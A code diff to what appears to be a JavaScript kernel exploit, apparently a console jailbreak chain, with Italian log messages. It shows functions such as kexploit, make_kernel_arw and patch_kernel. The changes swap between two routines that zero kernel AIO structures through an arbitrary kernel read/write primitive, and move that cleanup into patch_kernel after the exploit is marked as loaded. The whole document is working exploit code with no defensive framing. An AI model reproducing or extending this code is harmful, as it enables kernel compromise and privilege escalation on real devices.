@@ -77,22 +77,22 @@ function allocate_jit_stub() {
 
 function zero_out_aio(kmem, addr) {
 
-      try {
+    /*  try {
     for (let off = 8; off < 0x80; off += 8) {
       kmemLocal.write64(addr.add(off), 0);
     }
     log(`✅ AIO @ 0x${addr.toString(16)}: byte 0x08–0x7F azzerati`);
   } catch (e) {
     log(`❌ Errore in zero_out_aio_skip_first: ${e}`);
-  }
- /* try {
+  }*/
+  try {
     const zero = new Buffer(0x80);
     zero.fill(0);
     kmem.copyin(zero.addr, addr, zero.size);
     log(`✅ AIO @ 0x${addr.toString(16)} azzerato`);
   } catch (e) {
     log(`❌ Errore durante zero_out_aio: ${e}`);
-  }*/
+  } 
 }
 
 function debug_aio_memory_state(kmem, addr, label = "AIO") {
@@ -1691,6 +1691,20 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes";
    //alert("kernel exploit succeeded!");
+
+
+   log('__________________TEST________________________');
+    
+   
+  debug_aio_memory_state(kmem, reqs1_addr, "AIO – prima della pulizia");
+
+            zero_out_aio(kmem, reqs1_addr);
+
+         debug_aio_memory_state(kmem, reqs1_addr, "AIO – dopo la pulizia");
+        
+            log('__________________TEST________________________');
+
+    
 }
 
 
@@ -1846,24 +1860,7 @@ export async function kexploit() {
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
         
-            log('__________________TEST________________________');
-     
-
-   
-  debug_aio_memory_state(kmem, reqs1_addr, "AIO – prima della pulizia");
-
-
-    //    apply_jit_caps(kmem, p_ucred);
-
- 
-      //   const stub_addr = allocate_jit_stub();
-
-            zero_out_aio(kmem, reqs1_addr);
-
-         debug_aio_memory_state(kmem, reqs1_addr, "AIO – dopo la pulizia");
-        
-            log('__________________TEST________________________');
-
+         
 
 
         
